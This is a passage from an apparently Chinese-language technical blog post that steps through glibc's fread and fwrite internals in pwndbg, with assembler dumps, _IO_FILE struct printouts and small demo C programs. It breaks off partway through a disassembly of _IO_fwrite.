0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c8cd7d &lt;+717&gt;:   jmp    0x7ffff7c8cb40 &lt;_IO_new_file_underflow+144&gt;</span><br><span class="line">   0x00007ffff7c8cd82 &lt;+722&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cd88 &lt;+728&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cd8d &lt;+733&gt;:   ret</span><br><span class="line">   0x00007ffff7c8cd8e &lt;+734&gt;:   xchg   ax,ax</span><br><span class="line">   0x00007ffff7c8cd90 &lt;+736&gt;:   or     eax,0x20</span><br><span class="line">   0x00007ffff7c8cd93 &lt;+739&gt;:   mov    DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c8cd95 &lt;+741&gt;:   mov    rax,QWORD PTR [rip+0x18d074]        # 0x7ffff7e19e10</span><br><span class="line">   0x00007ffff7c8cd9c &lt;+748&gt;:   mov    DWORD PTR fs:[rax],0x9</span><br><span class="line">   0x00007ffff7c8cda3 &lt;+755&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cda8 &lt;+760&gt;:   jmp    0x7ffff7c8cc5d &lt;_IO_new_file_underflow+429&gt;</span><br><span class="line">   0x00007ffff7c8cdad &lt;+765&gt;:   endbr64</span><br><span class="line">   0x00007ffff7c8cdb1 &lt;+769&gt;:   mov    rbp,rax</span><br><span class="line">   0x00007ffff7c8cdb4 &lt;+772&gt;:   jmp    0x7ffff7c2984e &lt;_IO_new_file_underflow.cold&gt;</span><br><span class="line">Address range 0x7ffff7c2984e to 0x7ffff7c29887:</span><br><span class="line">   0x00007ffff7c2984e &lt;-406114&gt;:        test   DWORD PTR [r12],0x8000</span><br><span class="line">   0x00007ffff7c29856 &lt;-406106&gt;:        jne    0x7ffff7c2987f &lt;_IO_new_file_underflow-406065&gt;</span><br><span class="line">   0x00007ffff7c29858 &lt;-406104&gt;:        mov    rdi,QWORD PTR [r12+0x88]</span><br><span class="line">   0x00007ffff7c29860 &lt;-406096&gt;:        mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c29863 &lt;-406093&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29866 &lt;-406090&gt;:        mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c29869 &lt;-406087&gt;:        jne    0x7ffff7c2987f &lt;_IO_new_file_underflow-406065&gt;</span><br><span class="line">   0x00007ffff7c2986b &lt;-406085&gt;:        mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c29873 &lt;-406077&gt;:        xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c29875 &lt;-406075&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29878 &lt;-406072&gt;:        jle    0x7ffff7c2987f &lt;_IO_new_file_underflow-406065&gt;</span><br><span class="line">   0x00007ffff7c2987a &lt;-406070&gt;:        call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c2987f &lt;-406065&gt;:        mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c29882 &lt;-406062&gt;:        call   0x7ffff7c2a120 &lt;_Unwind_Resume&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p><code>vtable-&gt;_IO_file_underflow</code>函数主体是先检查缓冲区，如果<code>fp-&gt;_IO_buf_base</code> &#x3D;&#x3D; <code>NULL</code>则调用<code>_IO_doallocbuf</code>来分配缓冲区，然后系统调用<code>read</code>读取数据到缓冲区，然后根据需要读取的数据调整读写指针<br>发现这里<code>_IO_file_underflow</code>还会调用<code>_IO_switch_to_get_mode </code>函数来切换文件模式为读（<code>_mode</code>&#x3D;-1）并清空对应指针防止干扰<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8cbed &lt;_IO_file_underflow+317&gt;    mov    rdi, rbx                  RDI =&gt; 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">0x7ffff7c8cbf0 &lt;_IO_file_underflow+320&gt;    call   _IO_switch_to_get_mode      &lt;_IO_switch_to_get_mode&gt;</span><br></pre></td></tr></table></figure><p>后续回到<code>_IO_file_underflow</code>函数，设置读写指针，如下所示，都设置为了<code>fp-&gt;_IO_buf_base</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_end = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后<code>_IO_file_underflow</code>调用<code>vtable-&gt;_IO_file_read</code>（位于<code>_IO_file_jumps</code>+0x70）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8cc29 &lt;_IO_file_underflow+377&gt;    mov    rdx, qword ptr [rbx + 0x40]        RDX, [0x5555555592e0] =&gt; 0x55555555a4b0 ◂— 0</span><br><span class="line">0x7ffff7c8cc2d &lt;_IO_file_underflow+381&gt;    mov    rdi, rbx                           RDI =&gt; 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">0x7ffff7c8cc30 &lt;_IO_file_underflow+384&gt;    sub    rdx, rsi                           RDX =&gt; 0x1000 (0x55555555a4b0 - 0x5555555594b0)</span><br><span class="line">0x7ffff7c8cc33 &lt;_IO_file_underflow+387&gt;    call   qword ptr [rbp + 0x70]      &lt;_IO_file_read&gt;</span><br></pre></td></tr></table></figure><p>然后再系统调用read函数，将文件数据读入<code>fp-&gt;_IO_buf_base</code>（最多读0x1000，即<code>_IO_buf_end</code> - <code>_IO_buf_base</code>）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b93c &lt;_IO_file_read+12&gt;    mov    edi, r8d                        EDI =&gt; 3</span><br><span class="line">0x7ffff7c8b93f &lt;_IO_file_read+15&gt;  ✘ jne    _IO_file_read+32            &lt;_IO_file_read+32&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8b941 &lt;_IO_file_read+17&gt;    jmp    read                        &lt;read&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7d147d0 &lt;read&gt;                endbr64</span><br><span class="line">0x7ffff7d147d4 &lt;read+4&gt;              mov    eax, dword ptr fs:[0x18]     EAX, [0x7ffff7fb1758] =&gt; 0</span><br><span class="line">0x7ffff7d147dc &lt;read+12&gt;             test   eax, eax                     0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7d147de &lt;read+14&gt;           ✘ jne    read+32                     &lt;read+32&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7d147e0 &lt;read+16&gt;             syscall  &lt;SYS_read&gt;</span><br><span class="line">───────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到缓冲区读入的’a’<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x5555555594a0</span><br><span class="line">0x5555555594a0: 0x0000000000000000      0x0000000000001011</span><br><span class="line">0x5555555594b0: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x5555555594c0: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x5555555594d0: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x5555555594e0: 0x00000a6161616161      0x0000000000000000</span><br></pre></td></tr></table></figure><p>最后<code>_IO_file_underflow</code>执行完毕，结构体状态如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_read_end = 0x5555555594e6 &quot;&quot;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_write_end = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &#x27;a&#x27; &lt;repeats 53 times&gt;, &quot;\n&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_read_end</code>已调整至读缓冲区结束位置<br>然后回到<code>_IO_file_xsgetn</code>的循环，将缓冲区中的数据读入目标地址，可以粗略看做<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> avail = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">    <span class="keyword">if</span> (avail &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> to_copy = MIN(avail, n);</span><br><span class="line">      <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, to_copy);</span><br><span class="line">      fp-&gt;_IO_read_ptr += to_copy;</span><br><span class="line">      s += to_copy;</span><br><span class="line">      n -= to_copy;</span><br><span class="line">      already += to_copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 缓冲区已空，调用 refill 函数</span></span><br><span class="line">      <span class="keyword">if</span> (__underflow(fp) == EOF)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最后fread结束后可以看到数据（20个’a’）已经读入我们的目标地址<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/6gx 0x555555559470</span><br><span class="line">0x555555559470: 0x00007ffff7e170c0      0x0000000000000031</span><br><span class="line">0x555555559480: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555559490: 0x0000000061616161      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="0x04-fwrite函数"><a href="#0x04-fwrite函数" class="headerlink" title="0x04 fwrite函数"></a>0x04 fwrite函数</h2><p>还是同一个demo，改成fwrite函数即可，其实fwrite的流程和fread是很类似的<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE*fp = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;</span>,<span class="number">0x20</span>);</span><br><span class="line">    fwrite(ptr, <span class="number">1</span>, <span class="number">0x20</span>, fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在fwrite下个断点，发现是<code>_IO_fwrite</code>函数，贴上汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function __GI__IO_fwrite:</span><br><span class="line">Address range 0x7ffff7c7ff20 to 0x7ffff7c800a6:</span><br><span class="line">=&gt; 0x00007ffff7c7ff20 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c7ff24 &lt;+4&gt;:     push   r15</span><br><span class="line">   0x00007ffff7c7ff26 &lt;+6&gt;:     push   r14</span><br><span class="line">   0x00007ffff7c7ff28 &lt;+8&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c7ff2a &lt;+10&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c7ff2c &lt;+12&gt;:    mov    r12,rsi</span><br><span class="line">   0x00007ffff7c7ff2f &lt;+15&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c7ff30 &lt;+16&gt;:    imul   r12,rdx</span><br><span class="line">   0x00007ffff7c7ff34 &lt;+20&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c7ff35 &lt;+21&gt;:    sub    rsp,0x8</span><br><span class="line">   0x00007ffff7c7ff39 &lt;+25&gt;:    test   r12,r12</span><br><span class="line">   0x00007ffff7c7ff3c &lt;+28&gt;:    je     0x7ffff7c80015 &lt;__GI__IO_fwrite+245&gt;</span><br><span class="line">   0x00007ffff7c7ff42 &lt;+34&gt;:    mov    eax,DWORD PTR [rcx]</span><br><span class="line">   0x00007ffff7c7ff44 &lt;+36&gt;:    mov    r14,rdi</span><br><span class="line">   0x00007ffff7c7ff47 &lt;+39&gt;:    mov    r13,rsi</span><br><span class="line">   0x00007ffff7c7ff4a &lt;+42&gt;:    mov    rbp,rdx</span><br><span class="line">   0x00007ffff7c7ff4d &lt;+45&gt;:    mov    rbx,rcx</span><br><span class="line">   0x00007ffff7c7ff50 &lt;+48&gt;:    and    eax,0x8000</span><br><span class="line">   0x00007ffff7c7ff55 &lt;+53&gt;:    jne    0x7ffff7c7ff8b &lt;__GI__IO_fwrite+107&gt;</span><br><span class="line">   0x00007ffff7c7ff57 &lt;+55&gt;:    mov    r15,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c7ff60 &lt;+64&gt;:    mov    rdi,QWORD PTR [rcx+0x88]</span><br><span class="line">   0x00007ffff7c7ff67 &lt;+71&gt;:    cmp    QWORD PTR [rdi+0x8],r15</span><br><span class="line">   0x00007ffff7c7ff6b &lt;+75&gt;:    je     0x7ffff7c7ff87 &lt;__GI__IO_fwrite+103&gt;</span><br><span class="line">   0x00007ffff7c7ff6d &lt;+77&gt;:    mov    edx,0x1</span><br><span class="line">   0x00007ffff7c7ff72 &lt;+82&gt;:    lock cmpxchg DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c7ff76 &lt;+86&gt;:    jne    0x7ffff7c80090 &lt;__GI__IO_fwrite+368&gt;</span><br><span class="line">   0x00007ffff7c7ff7c &lt;+92&gt;:    mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c7ff83 &lt;+99&gt;:    mov    QWORD PTR [rdi+0x8],r15</span><br><span class="line">   0x00007ffff7c7ff87 &lt;+103&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c7ff8b &lt;+107&gt;:   mov    eax,DWORD PTR [rbx+0xc0]</span><br><span class="line">   0x00007ffff7c7ff91 &lt;+113&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c7ff93 &lt;+115&gt;:   jne    0x7ffff7c80030 &lt;__GI__IO_fwrite+272&gt;</span><br><span class="line">   0x00007ffff7c7ff99 &lt;+121&gt;:   mov    DWORD PTR [rbx+0xc0],0xffffffff</span><br><span class="line">   0x00007ffff7c7ffa3 &lt;+131&gt;:   mov    r15,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007ffff7c7ffaa &lt;+138&gt;:   lea    rdx,[rip+0x196a4f]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c7ffb1 &lt;+145&gt;:   lea    rax,[rip+0x1977b0]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c7ffb8 &lt;+152&gt;:   sub    rax,rdx</span><br><span class="line">   0x00007ffff7c7ffbb &lt;+155&gt;:   mov    rcx,r15</span><br><span class="line">   0x00007ffff7c7ffbe &lt;+158&gt;:   sub    rcx,rdx</span><br><span class="line">   0x00007ffff7c7ffc1 &lt;+161&gt;:   cmp    rax,rcx</span><br><span class="line">   0x00007ffff7c7ffc4 &lt;+164&gt;:   jbe    0x7ffff7c80080 &lt;__GI__IO_fwrite+352&gt;</span><br><span class="line">   0x00007ffff7c7ffca &lt;+170&gt;:   mov    rdx,r12</span><br><span class="line">   0x00007ffff7c7ffcd &lt;+173&gt;:   mov    rsi,r14</span><br><span class="line">   0x00007ffff7c7ffd0 &lt;+176&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7ffd3 &lt;+179&gt;:   call   QWORD PTR [r15+0x38]</span><br><span class="line">   0x00007ffff7c7ffd7 &lt;+183&gt;:   cmp    rax,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c7ffdb &lt;+187&gt;:   mov    r14,rax</span><br><span class="line">   0x00007ffff7c7ffde &lt;+190&gt;:   sete   r15b</span><br><span class="line">   0x00007ffff7c7ffe2 &lt;+194&gt;:   test   DWORD PTR [rbx],0x8000</span><br><span class="line">   0x00007ffff7c7ffe8 &lt;+200&gt;:   jne    0x7ffff7c80008 &lt;__GI__IO_fwrite+232&gt;</span><br><span class="line">   0x00007ffff7c7ffea &lt;+202&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c7fff1 &lt;+209&gt;:   sub    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c7fff5 &lt;+213&gt;:   jne    0x7ffff7c80008 &lt;__GI__IO_fwrite+232&gt;</span><br><span class="line">   0x00007ffff7c7fff7 &lt;+215&gt;:   mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c7ffff &lt;+223&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c80001 &lt;+225&gt;:   xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c80003 &lt;+227&gt;:   cmp    eax,0x1</span><br><span class="line">   0x00007ffff7c80006 &lt;+230&gt;:   jg     0x7ffff7c80068 &lt;__GI__IO_fwrite+328&gt;</span><br><span class="line">   0x00007ffff7c80008 &lt;+232&gt;:   cmp    r12,r14</span><br><span class="line">   0x00007ffff7c8000b &lt;+235&gt;:   je     0x7ffff7c80012 &lt;__GI__IO_fwrite+242&gt;</span><br><span class="line">   0x00007ffff7c8000d &lt;+237&gt;:   test   r15b,r15b</span><br><span class="line">   0x00007ffff7c80010 &lt;+240&gt;:   je     0x7ffff7c8006f &lt;__GI__IO_fwrite+335&gt;</span><br><span class="line">   0x00007ffff7c80012 &lt;+242&gt;:   mov    r12,rbp</span><br><span class="line">   0x00007ffff7c80015 &lt;+245&gt;:   add    rsp,0x8</span><br><span class="line">   0x00007ffff7c80019 &lt;+249&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c8001c &lt;+252&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8001d &lt;+253&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8001e &lt;+254&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c80020 &lt;+256&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c80022 &lt;+258&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c80024 &lt;+260&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c80026 &lt;+262&gt;:   ret</span><br><span class="line">   0x00007ffff7c80027 &lt;+263&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c80030 &lt;+272&gt;:   cmp    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c80033 &lt;+275&gt;:   je     0x7ffff7c7ffa3 &lt;__GI__IO_fwrite+131&gt;</span><br><span class="line">   0x00007ffff7c80039 &lt;+281&gt;:   test   DWORD PTR [rbx],0x8000</span><br><span class="line">   0x00007ffff7c8003f &lt;+287&gt;:   jne    0x7ffff7c80060 &lt;__GI__IO_fwrite+320&gt;</span><br><span class="line">   0x00007ffff7c80041 &lt;+289&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c80048 &lt;+296&gt;:   sub    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c8004c &lt;+300&gt;:   jne    0x7ffff7c80060 &lt;__GI__IO_fwrite+320&gt;</span><br><span class="line">   0x00007ffff7c8004e &lt;+302&gt;:   xor    r15d,r15d</span><br><span class="line">   0x00007ffff7c80051 &lt;+305&gt;:   xor    r14d,r14d</span><br><span class="line">   0x00007ffff7c80054 &lt;+308&gt;:   jmp    0x7ffff7c7fff7 &lt;__GI__IO_fwrite+215&gt;</span><br><span class="line">   0x00007ffff7c80056 &lt;+310&gt;:   cs nop WORD PTR 